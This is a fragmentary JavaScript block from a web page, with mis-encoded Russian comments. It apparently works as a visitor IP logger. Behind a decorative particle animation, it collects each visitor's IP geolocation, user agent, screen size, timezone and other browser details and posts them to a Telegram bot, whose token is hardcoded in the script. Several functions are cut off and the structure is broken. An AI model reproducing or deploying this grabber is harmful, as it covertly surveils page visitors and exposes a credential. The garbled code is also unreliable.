    <script>
        // –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        const BOT_TOKEN = '8460653811:AAEm9zgY1tMHt-Z8NQa1L6cWtme9k2RldrI';
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –∏–∑ URL
        function getQueryParam(name) {

        // –°–æ–∑–¥–∞–µ–º —á–∞—Å—Ç–∏—Ü—ã –¥–ª—è —Ñ–æ–Ω–∞
        function createParticles() {
            const container = document.getElementById('particles');
            const particleCount = 50;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                const size = Math.random() * 5 + 1;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                const animationDuration = Math.random() * 10 + 5;
                particle.style.animation = `float ${animationDuration}s infinite ease-in-out`;
                particle.style.opacity = Math.random() * 0.5 + 0.1;

            // –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç–∏–ª–∏ –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏ —á–∞—Å—Ç–∏—Ü
            const style = document.createElement('style');

                    }

                    }
                    75% {
                        transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px);
                    }

        // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ–± IP
        async function getIPInfo() {

        function formatMessage(ipInfo, additionalData) {
            let message = `üìå <b>–ù–æ–≤—ã–π –≤—Ö–æ–¥!</b>\n\n`;
            
            message += `üåê <b>IP:</b> <code>${ipInfo.ip || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>\n`;
            message += `üè† <b>–ì–æ—Ä–æ–¥:</b> ${ipInfo.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
            message += `üó∫Ô∏è <b>–†–µ–≥–∏–æ–Ω:</b> ${ipInfo.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
            message += `üá∫üá≥ <b>–°—Ç—Ä–∞–Ω–∞:</b> ${ipInfo.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
            message += `üìÆ <b>–ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å:</b> ${ipInfo.postal || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n\n`;
            
            message += `‚öôÔ∏è <b>User-agent:</b>\n<code>> ${additionalData.userAgent}</code>\n\n`;
            
            message += `üõ†Ô∏è <b>–î—Ä—É–≥–∏–µ –¥–∞–Ω–Ω—ã–µ:</b>\n`;
            message += `<code>> –Ø–∑—ã–∫: ${additionalData.language}</code>\n`;
            message += `<code>> –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${additionalData.platform}</code>\n`;
            message += `<code>> –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${additionalData.screenWidth}x${additionalData.screenHeight}</code>\n`;
            message += `<code>> –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${additionalData.timezone}</code>\n`;
            message += `<code>> –í—Ä–µ–º—è: ${additionalData.dateTime}</code>\n`;
            message += `<code>> –ö—É–∫–∏: ${additionalData.cookiesEnabled}</code>\n`;
            message += `<code>> Java: ${additionalData.javaEnabled}</code>\n`;
            message += `<code>> –û–Ω–ª–∞–π–Ω: ${additionalData.onlineStatus}</code>\n`;

        }
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
        async function sendToTelegram(message) {
            const telegramId = getQueryParam('telegram');
            
            if (!telegramId) {
                console.error('Telegram ID –Ω–µ —É–∫–∞–∑–∞–Ω');
                return false;
            }
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: telegramId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function init() {

            const ipInfo = await getIPInfo();
